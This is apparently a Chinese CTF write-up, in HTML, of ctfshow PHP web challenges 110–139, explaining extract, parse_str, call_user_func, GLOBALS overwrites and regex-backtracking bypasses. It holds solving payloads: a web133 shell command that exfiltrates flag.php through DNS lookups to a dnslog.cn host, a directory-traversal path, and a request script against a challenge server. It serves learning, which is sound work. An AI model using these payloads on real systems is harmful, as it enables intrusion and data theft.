+<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><ul>
+<li>只能使用字母，尝试去找含有<code>__tostring</code>能够遍历目录的类</li>
+</ul>
+<h3 id="The-FilesystemIterator-class-¶"><a href="#The-FilesystemIterator-class-¶" class="headerlink" title="The FilesystemIterator class ¶"></a>The FilesystemIterator class<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.filesystemiterator.php#class.filesystemiterator"> ¶</a></h3><ul>
+<li>继承的父类及其方法:</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsg7i5deixj30lb08h0tk.jpg" alt="image-20210714091037474"></p>
+<ul>
+<li>由于返回的只是文件名不是字符串，不能使用，类似的还有getPathname….</li>
+</ul>
+<p>另一个方法<code>getcwd</code>返回第一个文件名作为字符串</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsg7yi1opgj30ov05k3z7.jpg" alt="image-20210714092618262"></p>
+<ul>
+<li>访问文件</li>
+</ul>
+<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><ul>
+<li>v1是用来输出，v2用来覆盖v1的值</li>
+</ul>
+<p><strong>根据题目要求，我们需要使得v1的值为flag，由于在函数内部，我们需要外部的flag值通过传进函数内部</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgb0nkvn6j30ik07mt98.jpg" alt="image-20210714111212290"></p>
+<h2 id="Web112"><a href="#Web112" class="headerlink" title="Web112"></a>Web112</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsg8rf9g52j30vg0d4gni.jpg" alt="image-20210714095407285"></p>
+<ul>
+<li>这两个函数都支持伪协议，不让过滤就不过滤直接读取</li>
+</ul>
+<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsg9bsuol8j30sl0dbjtg.jpg" alt="image-20210714101342704"></p>
+<ul>
+<li>查看官方文档寻找可以使用的php伪协议</li>
+</ul>
+<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><ul>
+<li>没有过滤filter协议</li>
+</ul>
+<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgadte7axj30ub0d6gnw.jpg" alt="image-20210714105015214"></p>
+<ul>
+<li><code>trim()</code>:去掉字符串的首尾空格</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgaf2g4ohj30jg0a7gmz.jpg" alt="image-20210714105127431"></p>
+<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><ul>
+<li><p>POST传参数<code>\.\[</code>会被转化成<code>_</code>不过只转换一次</p>
+</li>
+<li><p>直接输出<code>flag</code></p>
+</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgbacul46j30w90f5mzt.jpg" alt="image-20210714112131691"></p>
+<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><ul>
+<li><code>extract</code></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">接受一个数组，并把键名当作变量名，把值当作对应变量的值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+  <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"large"</span><span class="token punctuation">;</span>
+  <span class="token variable">$var_array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"color"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"blue"</span><span class="token punctuation">,</span>
+                    <span class="token string double-quoted-string">"size"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"medium"</span><span class="token punctuation">,</span>
+                    <span class="token string double-quoted-string">"shape"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"sphere"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$var_array</span><span class="token punctuation">,</span><span class="token constant">EXT_PREFIX_SAME</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"wddx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$color</span></span>,<span class="token interpolation"><span class="token variable">$size</span></span>,<span class="token interpolation"><span class="token variable">$shape</span></span>,<span class="token interpolation"><span class="token variable">$wddx_size</span></span>\n"</span><span class="token punctuation">;</span>
+  
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsggt8zw0gj30nt03haa6.jpg" alt="image-20210714143238714"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgh47st82j30sf09a75p.jpg" alt="image-20210714144312454"></p>
+<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><ul>
+<li><code>parse_str</code></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsghk4z31qj30nq05jwf9.jpg" alt="image-20210714145830983"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsghyllw6wj30cs04974m.jpg" alt="image-20210714151225225"></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.parse-str.php">官方文档</a></p>
+<p>argv——–》泛指参数，如果提交多个参数，则表示为数组</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>a<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span>fl0g<span class="token operator">=</span>flag_give_me<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsghqt1tr4j306k01dq2x.jpg" alt="image-20210714150456454"></p>
+<ul>
+<li>此时$a为一个数组</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">$a[0]&#x3D;1
+
+$a[1]&#x3D;fl0g&#x3D;flag_give_me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>利用<code>parse_str</code>解析字符串成当前作用域的变量</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span> <span class="token variable">$fl0g</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag_give_me"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgm5hklkgj30ni071dgq.jpg" alt="image-20210714173725913"></p>
+<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p>$_GET方式<code>空格</code>可以代替<code>_</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgpxq81rvj306e01jt8y.jpg" alt="image-20210714194822504"></p>
+<h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><ul>
+<li>要求函数名，不能包含字母数字</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">// Set language to German</span>
+<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'LC_ALL=de_DE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">setlocale</span><span class="token punctuation">(</span><span class="token constant">LC_ALL</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'de_DE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Specify location of translation tables</span>
+<span class="token function">bindtextdomain</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"myPHPApp"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"./locale"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Choose domain</span>
+<span class="token function">textdomain</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"myPHPApp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Translation is looking for in ./locale/de_DE/LC_MESSAGES/myPHPApp.mo now</span>
+
+<span class="token comment">// Print a test message</span>
+<span class="token keyword">echo</span> <span class="token function">gettext</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Welcome to My PHP Application"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Or use the alias _() for gettext()</span>
+<span class="token keyword">echo</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Have a nice day"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgu1463ssj30gl04tgm1.jpg" alt="image-20210714220959755"></p>
+<p><code>gettex()</code>可以被<code>_</code>代替</p>
+<p>这个函数的作用相当于输出字符串，在这里作为第二个回调函数，可以想能够不接受参数的函数</p>
+<ul>
+<li><code>get_defined_vars</code>  //得到当前作用域的所有变量</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsguosgxw6j313j06u76d.jpg" alt="image-20210714223244732"></p>
+<h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p>目录穿越</p>
+<ul>
+<li>```php<br>/ctfshow/../../../../var/www/html/flag.php<pre class="line-numbers language-none"><code class="language-none">
+  
+
+## web130
+
+![image-20210714230603815](https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;large&#x2F;008i3skNly1gsgvngbczoj30j30dlgn3.jpg)
+
+重点在理解正则：第一个if匹配的是&#96;任何字符+ctfshow&#96;直接用&#96;ctfshow&#96;绕过
+
+
+
+## web131
+
+正则回溯会收到配置限制，要匹配的字符串超过一定的长度之后就不再匹配
+
+* 正则回溯
+
+在非贪婪匹配的情况下&#96;.+*?&#96;遇到可匹配可不匹配的字符先不匹配，交给之后的字符匹配，若未匹配成功，则返回由自己匹配，每一次提交返回称为一次回溯
+
+**如果回溯次数过多，停止回溯，不对后面的字符进行匹配**
+
+&#96;&#96;&#96;php
+&lt;?php str_repeat(&#39;very&#39;,&#39;250000&#39;).&#39;36Dctfshow&#39;;?&gt; &#x2F;&#x2F;一般保证前面的字符串&gt;1000000个字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+<p>小脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://39c7e2e9-2a58-4f22-9855-77dba8f58989.challenge.ctf.show:8080/"</span>
+
+<span class="token builtin">abs</span> <span class="token operator">=</span> <span class="token number">1000000</span>
+aps <span class="token operator">=</span> <span class="token number">100000</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    middle <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">abs</span><span class="token operator">+</span>aps<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> <span class="token string">'very'</span> <span class="token operator">*</span> middle <span class="token operator">+</span><span class="token string">'36Dctfshow'</span>
+    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'f'</span><span class="token punctuation">:</span>payload
+    <span class="token punctuation">&#125;</span>
+    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">'ctfshow&#123;'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">elif</span> <span class="token string">'Too Large'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token builtin">abs</span> <span class="token operator">=</span> middle
+    <span class="token keyword">elif</span> <span class="token string">'bye'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        aps <span class="token operator">=</span> middle
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="we-b132"><a href="#we-b132" class="headerlink" title="we b132"></a>we b132</h2><p>逻辑运算</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshfiopvarj30tv09jdh2.jpg" alt="image-20210715103326463"></p>
+<h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><p>dns数据外带,访问<code>dns.log</code></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">F&#x3D;&#96;$F&#96;; ping &#96;cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;&#x2F;&quot;[0-9]&quot;&#96;.ywukah.dnslog.cn -c 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-`相当于shell_code,但是这个函数没有回显" data-language="`相当于shell_code,但是这个函数没有回显"><code class="language-`相当于shell_code,但是这个函数没有回显">
+![image-20210715112031402](https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;large&#x2F;008i3skNly1gshgvnjvdsj30yf07h0u2.jpg)
+
+![image-20210715111946748](https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;large&#x2F;008i3skNly1gshguui27vj30m201vjrq.jpg)
+
+DNS外带原理：
+
+&#96;&#96;&#96;mak
+攻击者把自己的payload带上域名，那么数据库或者命令行在执行语句的时候，会将返回结果与域名拼接起来，这样查看域名商(dns.log)的ns记录就能看到查询的结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>这种方式适合一些，存在注入攻击，但无法看到回显的情况</strong></p>
+<h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p><code>parse_str:</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>接受url的get方式传来的参数
+以<span class="token constant">GET</span>方式传过来的值进行解析<span class="token punctuation">:</span>
+<span class="token operator">?</span>a<span class="token operator">=</span>b<span class="token operator">&amp;</span>c<span class="token operator">=</span>d 会被解析成
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token class-name type-declaration">b</span> <span class="token variable">$c</span><span class="token operator">=</span>d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>extract():</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">对接受的数组转变为变量
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+a <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+		<span class="token string single-quoted-string">'abab'</span><span class="token operator">=></span><span class="token string single-quoted-string">'abcd'</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">extract</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token keyword">echo</span> <span class="token variable">$abab</span> <span class="token comment">//abcd</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ul>
+<li>根据题意，可以构造</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">*</span> url传参：
+
+<span class="token operator">?</span><span class="token constant">_POST</span><span class="token punctuation">[</span>key1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">36</span>d<span class="token operator">&amp;</span><span class="token constant">_POST</span><span class="token punctuation">[</span>key2<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">36</span>d
+
+<span class="token operator">*</span> <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>解析
+
+<span class="token variable">$_POST</span><span class="token punctuation">[</span>key1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">36</span>d<span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>key2<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">36</span>d <span class="token comment">//不再需要POST传参</span>
+
+<span class="token operator">*</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span>解析<span class="token punctuation">:</span>
+
+<span class="token variable">$key1</span><span class="token operator">=</span><span class="token number">36</span>d
+<span class="token variable">$key2</span><span class="token operator">=</span><span class="token number">36</span>d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p>dns外带</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshn65o59yj30xs0bc409.jpg" alt="image-20210715145810799"></p>
+<p>nl命令查看文件，<code>awk</code>过滤行数找到<code>flag</code>的具体位置，<code>tr -cd</code> 匹配<code>flag</code></p>
+<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>shell命令tee：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls | tee 1.txt           &#x2F;&#x2F;将ls的执行结果保存到1.txt中(覆盖)
+ls | tee -a 1.txt        &#x2F;&#x2F;将执行结果追加到1.txt
+ls ｜ tee 1.txt 2.txt    &#x2F;&#x2F;将执行结果同时保存在1.txt和2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>与<code>&gt;</code>不同的是<code>tee</code>重定向之后会在终端显示结果</p>
+<p>Payload:</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls &#x2F; | tee 1
+访问1
+cat &#x2F;f149_15_h3r3 ｜ tee 2  &#x2F;&#x2F;根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsho6gn6okj30qh0a43zo.jpg" alt="image-20210715153307971"></p>
+<p><code>Static</code>方法不需要对象即可调用，调用方式<code>class::function</code></p>
+<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p><code>Call_user_func</code>函数的多种用法:</p>
+<ol>
+<li>基本用法:</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">* 直接收一个基本参数
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">barber</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You wanted a <span class="token interpolation"><span class="token variable">$type</span></span> haircut, no problem\n"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'barber'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"mushroom"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'barber'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"shave"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li>接受命名空间</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Foobar</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">print</span> <span class="token string double-quoted-string">"Hello world!\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token constant">__NAMESPACE__</span> <span class="token operator">.</span><span class="token string single-quoted-string">'\Foo::test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// As of PHP 5.3.0只有一个参数调用命名空间某个类的静态函数</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token constant">__NAMESPACE__</span> <span class="token operator">.</span><span class="token string single-quoted-string">'\Foo'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// As of PHP 5.3.0，第一个参数是命名空间下的某一个类，第二个参数是该类的金泰函数</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="3">
+<li>无命名空间的情况</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name">myclass</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">say_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello!\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"myclass"</span><span class="token punctuation">;</span>
+
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//接受一个数组，两个值分别是类和静态函数</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$classname</span> <span class="token operator">.</span><span class="token string single-quoted-string">'::say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// As of 5.2.3 //不用数组形式，也可以接受类和静态函数</span>
+
+<span class="token variable">$myobject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$myobject</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//接受一个对象，以及调用静态函数</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>总结:</p>
+<p><code>Call_user_func</code>函数：除了可以调用普通函数之外，也可以调用类中的静态函数，如果以数组形式传参，则不需要<code>::</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshpaaplkej30pp0bamy7.jpg" alt="image-20210715161125043"></p>
+<ul>
+<li>这道题是第3种情况</li>
+</ul>
+<h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><ul>
+<li>awk命令：按分隔符输出文本</li>
+</ul>
+<ol>
+<li>用法1</li>
+</ol>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">awk &#39;&#123;[pattern] action&#125;&#39; &#123;filenames&#125;   # 行匹配语句 awk &#39;&#39; 只能用单引号
+
+ 每行按空格或TAB分割，输出文本中的1、4项
+ $ awk &#39;&#123;print $1,$4&#125;&#39; log.txt
+ ---------------------------------------------
+ 2 a
+ 3 like
+ This&#39;s
+ 10 orange,apple,mongo
+ # 格式化输出
+ $ awk &#39;&#123;printf &quot;%-8s %-10s\n&quot;,$1,$4&#125;&#39; log.txt
+ ---------------------------------------------
+ 2        a
+ 3        like
+ This&#39;s
+ 10       orange,apple,mongo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshr5iluepj30fv028dft.jpg" alt="image-20210715171559817"></p>
+<ol start="2">
+<li>用法2:</li>
+</ol>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">awk -F  #-F相当于内置变量FS, 指定分割字符
+
+ awk -F, &#39;&#123;print $1,$2&#125;&#39;   log.txt
+ ---------------------------------------------
+ 2 this is a test
+ 3 Are you like awk
+ This&#39;s a test
+ 10 There are orange apple
+ # 或者使用内建变量
+ $ awk &#39;BEGIN&#123;FS&#x3D;&quot;,&quot;&#125; &#123;print $1,$2&#125;&#39;     log.txt
+ ---------------------------------------------
+ 2 this is a test
+ 3 Are you like awk
+ This&#39;s a test
+ 10 There are orange apple
+ # 使用多个分隔符.先使用空格分割，然后对分割结果再使用&quot;,&quot;分割
+ $ awk -F &#39;[ ,]&#39;  &#39;&#123;print $1,$2,$5&#125;&#39;   log.txt
+ ---------------------------------------------
+ 2 this test
+ 3 Are awk
+ This&#39;s a
+ 10 There apple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="3">
+<li>用法3</li>
+</ol>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">awk -v  # 设置变量
+
+$ awk -va&#x3D;1 &#39;&#123;print $1,$1+a&#125;&#39; log.txt
+ ---------------------------------------------
+ 2 3
+ 3 4
+ This&#39;s 1
+ 10 11
+ $ awk -va&#x3D;1 -vb&#x3D;s &#39;&#123;print $1,$1+a,$1b&#125;&#39; log.txt
+ ---------------------------------------------
+ 2 3 2s
+ 3 4 3s
+ This&#39;s 1 This&#39;ss
+ 10 11 10s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshrbchrqyj60ui0hpta502.jpg" alt="image-20210715172134933"></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-awk.html">awk教程</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshrse7c30j30fu0abmxr.jpg" alt="image-20210715173759499"></p>
+<ul>
+<li><code>cut</code>命令：显示每行从开头算起 num1 到 num2 的文字。</li>
+</ul>
+<p><strong>参数:</strong></p>
+<ul>
+<li>-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。</li>
+<li>-c ：以字符为单位进行分割。</li>
+<li>-d ：自定义分隔符，默认为制表符。</li>
+<li>-f ：与-d一起使用，指定显示哪个区域。</li>
+<li>-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的<br>范围之内，该字符将被写出；否则，该字符将被排除</li>
+</ul>
+<p>跑脚本:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">import requests
+import time
+import <span class="token keyword type-declaration">string</span>
